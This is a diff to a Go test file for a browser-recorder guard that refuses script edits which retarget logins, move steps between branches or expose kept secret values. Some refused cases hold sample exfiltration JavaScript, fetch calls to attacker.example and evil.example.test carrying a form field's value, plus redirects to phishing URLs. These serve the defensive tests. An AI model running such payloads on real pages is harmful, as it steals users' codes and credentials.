@@ -98,10 +98,37 @@ func withPageGuardRunLogic(s *dsl.Script) {
 	s.Config.RunLogic.Blocks = []dsl.RunLogicBlock{{Name: "flow", Children: []dsl.RunLogicChild{{Action: "Login"}, {Action: "Other"}}}}
 }
 
+// withPageGuardSwitch puts a switch before the kept fill whose matching case
+// opens the login page and whose other case visits another site, and a
+// parallel block whose branches each open a page.
+func withPageGuardSwitch(s *dsl.Script) {
+	insertPageGuardStep(s, "Fill code", dsl.Action{Name: "Pick page", Type: "control_switch", Control: &dsl.ControlFlow{Cases: []dsl.SwitchCase{
+		{Condition: &dsl.Condition{Left: "a", Op: "eq", Right: "a"}, Steps: []dsl.Action{{Name: "Go legit", Type: "browser_navigate", Target: "https://app.example.test/login"}}},
+		{Condition: &dsl.Condition{Left: "a", Op: "eq", Right: "b"}, Steps: []dsl.Action{{Name: "Go other", Type: "browser_navigate", Target: "https://other.example.test/phish"}}},
+	}}})
+	insertPageGuardStep(s, "Fill code", dsl.Action{Name: "Both pages", Type: "control_parallel", Control: &dsl.ControlFlow{Branches: []dsl.ParallelBranch{
+		{Name: "main", Steps: []dsl.Action{{Name: "Branch legit", Type: "browser_navigate", Target: "https://app.example.test/home"}}},
+		{Name: "side", Steps: []dsl.Action{{Name: "Branch other", Type: "browser_navigate", Target: "https://other.example.test/side"}}},
+	}}})
+}
+
 func pageGuardRefusedCases() []pageGuardCase {
 	evaluate := dsl.Action{Name: "Read field", Type: "browser_evaluate_js", Target: "fetch('https://attacker.example/?v='+document.querySelector('#code').value)"}
 	return []pageGuardCase{
 		{name: "navigate retargeted", edit: func(s *dsl.Script) { pageGuardStep(s, "Open login").Target = "https://attacker.example/login" }},
+		{name: "step moved across switch cases", setup: withPageGuardSwitch, edit: func(s *dsl.Script) {
+			cases := pageGuardStep(s, "Pick page").Control.Cases
+			cases[0].Steps = append(cases[0].Steps, cases[1].Steps...)
+			cases[1].Steps = nil
+		}},
+		{name: "switch case conditions swapped", setup: withPageGuardSwitch, edit: func(s *dsl.Script) {
+			cases := pageGuardStep(s, "Pick page").Control.Cases
+			cases[0].Condition, cases[1].Condition = cases[1].Condition, cases[0].Condition
+		}},
+		{name: "step moved across parallel branches", setup: withPageGuardSwitch, edit: func(s *dsl.Script) {
+			branches := pageGuardStep(s, "Both pages").Control.Branches
+			branches[0].Steps, branches[1].Steps = branches[1].Steps, branches[0].Steps
+		}},
 		{name: "navigate deleted", edit: func(s *dsl.Script) { s.Actions = s.Actions[1:] }},
 		{name: "navigate inserted before the fill", edit: func(s *dsl.Script) {
 			insertPageGuardStep(s, "Fill code", dsl.Action{Name: "Go", Type: "browser_navigate", Target: "https://attacker.example/"})
@@ -272,6 +299,14 @@ func TestRecorderEditPageRefusalNamesTheChange(t *testing.T) {
 
 func pageGuardAcceptedCases() []pageGuardCase {
 	return []pageGuardCase{
+		{name: "scroll dropped beside an untouched switch and parallel block", setup: withPageGuardSwitch, edit: func(s *dsl.Script) {
+			for index := range s.Actions {
+				if s.Actions[index].Name == "Scroll page" {
+					s.Actions = append(s.Actions[:index], s.Actions[index+1:]...)
+					break
+				}
+			}
+		}},
 		{name: "hovers, a masked fill and init deleted; headed with screenshots", edit: func(s *dsl.Script) {
 			kept := s.Actions[:0]
 			for _, action := range s.Actions {
@@ -566,5 +601,217 @@ func TestAlignBrowserPageSteps(t *testing.T) {
 	pairs, _, changed := alignBrowserPageSteps([]browserPageStep{signIn}, []browserPageStep{signIn})
 	if changed || len(pairs) != 1 || pairs[0][0] != "" {
 		t.Fatalf("sign-in entry pairs = %v changed=%v, want one unpathed pair", pairs, changed)
+	}
+}
+
+// A recorded locator that quotes the kept value: binding the value to a
+// runtime secret says to remove the locator with it, and doing both saves.
+func TestRecorderEditBindingAQuotedKeptValueNamesTheLocator(t *testing.T) {
+	quote := func(s *dsl.Script) {
+		s.Actions = append(s.Actions, dsl.Action{Name: "Greeting", Type: "browser_click", Selector: "#greeting", Target: "#greeting",
+			Metadata: map[string]any{selector.MetadataCandidatesKey: []any{map[string]any{
+				"kind": "text", "value": "Welcome " + recorderKeptValue, "confidence": float64(60), "reason": "visible text"}}}})
+	}
+	bind := func(s *dsl.Script) { pageGuardStep(s, "Fill code").Value = "{{secret.code}}" }
+	_, err := runPageGuardCase(t, true, false, pageGuardCase{setup: quote, edit: bind})
+	if err == nil || !strings.Contains(err.Error(), "recorded selector locator") || strings.Contains(err.Error(), recorderKeptValue) {
+		t.Fatalf("err = %v, want the refusal to name the quoting locator without quoting the value", err)
+	}
+	_, err = runPageGuardCase(t, true, false, pageGuardCase{setup: quote, edit: func(s *dsl.Script) {
+		bind(s)
+		delete(pageGuardStep(s, "Greeting").Metadata, selector.MetadataCandidatesKey)
+	}})
+	if err != nil {
+		t.Fatalf("binding and removing the quoting locator together was refused: %v", err)
+	}
+}
+
+// With two kept values, binding or deleting one of them is accepted: the
+// other's page flow is unchanged. Anything else that moves the flow is not.
+func TestRecorderEditBindsOneOfSeveralKeptValues(t *testing.T) {
+	second := func(s *dsl.Script) {
+		insertPageGuardStep(s, "Fill code", dsl.Action{Name: "Fill otp", Type: "browser_fill", Selector: "#otp", Target: "#otp",
+			Value: "otp-" + recorderKeptValue + "-2", Metadata: map[string]any{"source_marked_secret": true}})
+	}
+	for _, stamped := range []bool{false, true} {
+		for name, edit := range map[string]func(*dsl.Script){
+			"bind": func(s *dsl.Script) { pageGuardStep(s, "Fill otp").Value = "{{secret.otp}}" },
+			"bind and unmark": func(s *dsl.Script) {
+				o := pageGuardStep(s, "Fill otp")
+				o.Value = "{{secret.otp}}"
+				delete(o.Metadata, "source_marked_secret")
+			},
+			"delete": func(s *dsl.Script) { removePageGuardStep(s, "Fill otp") },
+		} {
+			if _, err := runPageGuardCase(t, true, stamped, pageGuardCase{setup: second, edit: edit}); err != nil {
+				t.Errorf("%s (stamped %v) refused: %v", name, stamped, err)
+			}
+		}
+		_, err := runPageGuardCase(t, true, stamped, pageGuardCase{setup: second, edit: func(s *dsl.Script) {
+			o := pageGuardStep(s, "Fill otp")
+			o.Value, o.Selector, o.Target = "{{secret.otp}}", "#elsewhere", "#elsewhere"
+		}})
+		if err == nil {
+			t.Errorf("bind plus a retargeted selector (stamped %v) accepted", stamped)
+		}
+	}
+}
+
+func removePageGuardStep(s *dsl.Script, name string) {
+	for index := range s.Actions {
+		if s.Actions[index].Name == name {
+			s.Actions = append(s.Actions[:index], s.Actions[index+1:]...)
+			return
+		}
+	}
+}
+
+// A pinned step that quotes a kept value may have only that value bound: a
+// retargeted navigate or a rewritten page script is still a page change.
+func TestRecorderEditBindingAKeptSpanCannotRewriteTheStep(t *testing.T) {
+	quoteInURL := func(s *dsl.Script) {
+		pageGuardStep(s, "Open login").Target = "https://app.example.test/login?code=" + recorderKeptValue
+	}
+	quoteInScript := func(s *dsl.Script) {
+		insertPageGuardStep(s, "Fill code", dsl.Action{Name: "Prime", Type: "browser_evaluate_js", Target: "window.code='" + recorderKeptValue + "'"})
+	}
+	for _, stamped := range []bool{false, true} {
+		for name, tc := range map[string]pageGuardCase{
+			"navigate retargeted": {setup: quoteInURL, edit: func(s *dsl.Script) { pageGuardStep(s, "Open login").Target = "https://evil.example.test/phish" }},
+			"navigate retargeted keeping a binding": {setup: quoteInURL, edit: func(s *dsl.Script) {
+				pageGuardStep(s, "Open login").Target = "https://evil.example.test/login?code={{secret.code}}"
+			}},
+			"page script replaced": {setup: quoteInScript, edit: func(s *dsl.Script) {
+				pageGuardStep(s, "Prime").Target = `fetch("https://evil.example.test/x?c="+document.querySelector("input").value)`
+			}},
+			"page script span bound": {setup: quoteInScript, edit: func(s *dsl.Script) {
+				pageGuardStep(s, "Prime").Target = "window.code='{{env.T}}'"
+			}},
+			"navigate host bound": {setup: func(s *dsl.Script) {
+				pageGuardStep(s, "Open login").Target = "https://" + recorderKeptValue + ".example.test/login"
+			}, edit: func(s *dsl.Script) { pageGuardStep(s, "Open login").Target = "https://{{env.H}}.example.test/login" }},
+			"locator span bound": {setup: func(s *dsl.Script) {
+				insertPageGuardStep(s, "Fill code", dsl.Action{Name: "Pick user", Type: "browser_click",
+					Selector: `button:has-text("` + recorderKeptValue + `")`, Target: `button:has-text("` + recorderKeptValue + `")`})
+			}, edit: func(s *dsl.Script) {
+				step := pageGuardStep(s, "Pick user")
+				step.Selector, step.Target = `button:has-text("{{secret.pick}}")`, `button:has-text("{{secret.pick}}")`
+			}},
+		} {
+			if _, err := runPageGuardCase(t, true, stamped, tc); err == nil {
+				t.Errorf("%s (stamped %v) accepted", name, stamped)
+			}
+		}
+		// A kept value in a URL is bound in the same save as the other kept
+		// values: alone, the binding could add a redirect parameter.
+		if _, err := runPageGuardCase(t, true, stamped, pageGuardCase{setup: quoteInURL, edit: func(s *dsl.Script) {
+			pageGuardStep(s, "Open login").Target = "https://app.example.test/login?code={{secret.code}}"
+		}}); err == nil {
+			t.Errorf("binding a URL span alone (stamped %v) accepted", stamped)
+		}
+		if _, err := runPageGuardCase(t, true, stamped, pageGuardCase{setup: quoteInURL, edit: func(s *dsl.Script) {
+			pageGuardStep(s, "Open login").Target = "https://app.example.test/login?code={{secret.code}}"
+			pageGuardStep(s, "Fill code").Value = "{{secret.code}}"
+		}}); err != nil {
+			t.Errorf("binding every kept value in one save (stamped %v) refused: %v", stamped, err)
+		}
+	}
+}
+
+// With another kept value still in the recording, binding the quoted one and
+// removing the locator that quotes it, as the refusal says, saves.
+func TestRecorderEditBindsAQuotedValueWhileAnotherIsKept(t *testing.T) {
+	setup := func(s *dsl.Script) {
+		insertPageGuardStep(s, "Fill code", dsl.Action{Name: "Fill otp", Type: "browser_fill", Selector: "#otp", Target: "#otp",
+			Value: "otp-" + recorderKeptValue + "-2", Metadata: map[string]any{"source_marked_secret": true}})
+		s.Actions = append(s.Actions, dsl.Action{Name: "Greeting", Type: "browser_click", Selector: "#greeting", Target: "#greeting",
+			Metadata: map[string]any{selector.MetadataCandidatesKey: []any{map[string]any{
+				"kind": "text", "value": "Welcome " + recorderKeptValue, "confidence": float64(60), "reason": "visible text"}}}})
+	}
+	for _, stamped := range []bool{false, true} {
+		_, err := runPageGuardCase(t, true, stamped, pageGuardCase{setup: setup, edit: func(s *dsl.Script) {
+			pageGuardStep(s, "Fill code").Value = "{{secret.code}}"
+			delete(pageGuardStep(s, "Greeting").Metadata, selector.MetadataCandidatesKey)
+		}})
+		if err != nil {
+			t.Errorf("stamped %v: bind plus locator removal refused: %v", stamped, err)
+		}
+	}
+}
+
+// A fill whose own recorded locator quotes its kept value: binding the value
+// and dropping that locator in one save is accepted while another is kept.
+func TestRecorderEditBindsAFillWhoseOwnLocatorQuotesIt(t *testing.T) {
+	setup := func(s *dsl.Script) {
+		insertPageGuardStep(s, "Fill code", dsl.Action{Name: "Fill otp", Type: "browser_fill", Selector: "#otp", Target: "#otp",
+			Value: "otp-" + recorderKeptValue + "-2", Metadata: map[string]any{"source_marked_secret": true}})
+		withPageGuardMetadata(pageGuardStep(s, "Fill code"), selector.MetadataCandidatesKey, []any{map[string]any{
+			"kind": "text", "value": recorderKeptValue, "confidence": float64(60), "reason": "visible text"}})
+	}
+	for _, stamped := range []bool{false, true} {
+		if _, err := runPageGuardCase(t, true, stamped, pageGuardCase{setup: setup, edit: func(s *dsl.Script) {
+			step := pageGuardStep(s, "Fill code")
+			step.Value = "{{secret.code}}"
+			delete(step.Metadata, selector.MetadataCandidatesKey)
+		}}); err != nil {
+			t.Errorf("stamped %v: refused: %v", stamped, err)
+		}
+	}
+}
+
+// With run logic, the group pass allows what the walk does: dropping a
+// pinned step's recorded locator list, and binding a fill while dropping the
+// locator that quotes it.
+func TestRecorderEditRunLogicAllowsLocatorListDrops(t *testing.T) {
+	quoteOwn := func(s *dsl.Script) {
+		withPageGuardRunLogic(s)
+		insertPageGuardStep(s, "Fill code", dsl.Action{Name: "Fill otp", Type: "browser_fill", Selector: "#otp", Target: "#otp",
+			Value: "otp-" + recorderKeptValue + "-2", Metadata: map[string]any{"source_marked_secret": true, dsl.RunLogicActionMetadataKey: "Login"}})
+		withPageGuardMetadata(pageGuardStep(s, "Fill code"), selector.MetadataCandidatesKey, []any{map[string]any{
+			"kind": "text", "value": recorderKeptValue, "confidence": float64(60), "reason": "visible text"}})
+		withPageGuardMetadata(pageGuardStep(s, "Open login"), selector.MetadataCandidatesKey, []any{map[string]any{
+			"kind": "css", "value": "#login", "confidence": float64(90), "reason": "id"}})
+	}
+	for _, stamped := range []bool{false, true} {
+		for name, edit := range map[string]func(*dsl.Script){
+			"bind and drop own quote": func(s *dsl.Script) {
+				step := pageGuardStep(s, "Fill code")
+				step.Value = "{{secret.code}}"
+				delete(step.Metadata, selector.MetadataCandidatesKey)
+			},
+			"drop a pinned step's list": func(s *dsl.Script) { delete(pageGuardStep(s, "Open login").Metadata, selector.MetadataCandidatesKey) },
+		} {
+			if _, err := runPageGuardCase(t, true, stamped, pageGuardCase{setup: quoteOwn, edit: edit}); err != nil {
+				t.Errorf("%s (stamped %v) refused: %v", name, stamped, err)
+			}
+		}
+	}
+}
+
+// A step's own selector that quotes the kept value: binding or deleting the
+// kept fill would unmask the quote, so it is refused until the selector is
+// rewritten in the same save.
+func TestRecorderEditRefusesUnmaskingAQuotingSelector(t *testing.T) {
+	quote := func(s *dsl.Script) {
+		s.Actions = append(s.Actions, dsl.Action{Name: "Greeting", Type: "browser_click",
+			Selector: "text=Welcome " + recorderKeptValue, Target: "text=Welcome " + recorderKeptValue})
+	}
+	for _, stamped := range []bool{false, true} {
+		for name, edit := range map[string]func(*dsl.Script){
+			"bind":   func(s *dsl.Script) { pageGuardStep(s, "Fill code").Value = "{{secret.code}}" },
+			"delete": func(s *dsl.Script) { removePageGuardStep(s, "Fill code") },
+		} {
+			_, err := runPageGuardCase(t, true, stamped, pageGuardCase{setup: quote, edit: edit})
+			if err == nil || strings.Contains(err.Error(), recorderKeptValue) {
+				t.Errorf("%s (stamped %v): err = %v, want a refusal that does not quote the value", name, stamped, err)
+			}
+		}
+		if _, err := runPageGuardCase(t, true, stamped, pageGuardCase{setup: quote, edit: func(s *dsl.Script) {
+			pageGuardStep(s, "Fill code").Value = "{{secret.code}}"
+			step := pageGuardStep(s, "Greeting")
+			step.Selector, step.Target = "#greeting", "#greeting"
+		}}); err != nil {
+			t.Errorf("bind plus rewritten selector (stamped %v) refused: %v", stamped, err)
+		}
 	}
 }
